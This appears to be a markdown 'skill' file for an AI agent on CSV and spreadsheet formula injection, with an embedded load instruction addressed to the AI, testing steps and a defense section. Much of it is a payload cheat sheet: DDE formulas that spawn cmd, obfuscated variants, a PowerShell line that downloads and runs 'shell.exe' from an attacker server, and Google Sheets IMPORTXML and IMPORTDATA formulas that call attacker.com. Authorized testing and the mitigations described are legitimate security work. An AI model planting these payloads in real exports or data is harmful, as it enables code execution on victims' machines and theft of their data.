---
name: csv-formula-injection
description: >-
  CSV/spreadsheet formula injection (DDE, Excel/LibreOffice, Google Sheets IMPORT*). Use when exports, imports, or user fields feed spreadsheets or reporting tools.
---

# SKILL: CSV Formula Injection

> **AI LOAD INSTRUCTION**: This skill covers formula/DDE-style injection in CSV and spreadsheet contexts, obfuscation, cloud-sheet primitives, and safe testing methodology. Use only where **explicitly authorized**; payloads that invoke local commands or remote fetches are **impactful**—prefer lab targets and document consent. Do not target end users without program rules allowing client-side execution tests.

## 0. QUICK START

Characters that may trigger formula evaluation when a cell is opened in Excel, LibreOffice Calc, or similar (often only if the cell is interpreted as a formula):

```text
=
+
-
@
```

Test cells may look like:

```csv
name,value
test,=1+1
test,+1+1
test,-1+1
test,@SUM(1+1)
```

**Routing note**: when testing CSV exports, back-office reports, or user data opened in spreadsheets, prioritize these prefix characters.

---

## 1. DDE INJECTION (EXCEL / LIBREOFFICE)

Dynamic Data Exchange (DDE) and external call patterns historically abused in spreadsheets. Examples for **controlled lab** reproduction:

```text
DDE("cmd";"/C calc";"!A0")A0
```

```text
@SUM(1+1)*cmd|' /C calc'!A0
```

```text
=2+5+cmd|' /C calc'!A0
```

```text
=cmd|' /C calc'!'A1'
```

PowerShell-style chaining (lab only; replace host and payload with benign equivalents):

```text
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

---

## 2. OBFUSCATION

Defensive parsers may strip obvious patterns; testers may try noise and spacing (still only where allowed):

```text
AAAA+BBBB-CCCC&"Hello"/12345&cmd|'/c calc.exe'!A
```

Extra whitespace after `=`:

```text
=         cmd|'/c calc.exe'!A
```

Dispersed characters / unusual spacing (conceptual pattern—adjust per parser):

```text
=    C    m D    |'/c calc.exe'!A
```

`rundll32` style:

```text
=rundll32|'URL.dll,OpenURL calc.exe'!A
```

---

## 3. GOOGLE SHEETS

If exported data is later opened in **Google Sheets**, or sheets pull from untrusted CSV, these functions can cause **outbound requests** or **cross-document data pulls**:

**Data exfiltration / probe (replace URL with your authorized callback):**

```text
=IMPORTXML("http://attacker.com/", "//a/@href")
```

Other high-risk imports:

```text
=IMPORTRANGE("spreadsheet_url", "range")
=IMPORTHTML("http://attacker.com/table", "table", 1)
=IMPORTFEED("http://attacker.com/feed.xml")
=IMPORTDATA("http://attacker.com/data.csv")
```

Document which function executed and what network side effects occurred.

---

## 4. TESTING METHODOLOGY

1. **Map sinks** — Any feature that emits **CSV, XLSX, or tab-separated** output: admin exports, audit logs, user rosters, billing reports, search results.
2. **Trace user-controlled fields** — Profile fields, ticket titles, transaction memos, tags, filenames in ZIP exports—any column that echoes stored input.
3. **Inject formula prefixes** — Start with benign arithmetic (`=1+1`, `+1+1`) to detect evaluation; escalate only per rules.
4. **Open in target software** — Match victim workflow: Excel desktop, LibreOffice, Google Sheets import, locale-specific decimal separators.
5. **Evidence** — Screenshot/capture whether the cell shows a calculated result, a security warning, or DDE prompt; note product version.

**Note**: focus on the `user input -> export -> opened in spreadsheet software` chain.

---

## 5. DEFENSE

Application and export-layer mitigations:

- **Prefix with single quote** — In many spreadsheet apps, leading `'` forces **text** interpretation: `'=cmd|...` displays literally.
- **Prefix with tab** — Some pipelines treat tab-prefixed fields as non-formula text when ingested correctly.
- **Strip or neutralize leading triggers** — Remove or escape leading `=`, `+`, `-`, `@` (and Unicode lookalikes) at export time.
- **CSV encoding** — Use consistent quoting; validate column types; avoid passing raw formula strings into financial/reporting templates without sanitization.
- **User education** — Do not enable external data / DDE without policy.

Example safe export transformation (conceptual):

```text
Input:  =1+1
Output: '=1+1   OR   \t=1+1   OR   (empty prefix) with escaped quotes per RFC 4180
```

**Note**: when correlating business exports, reports, and API export parameters, combine with injection, business-logic, and API-security skills.
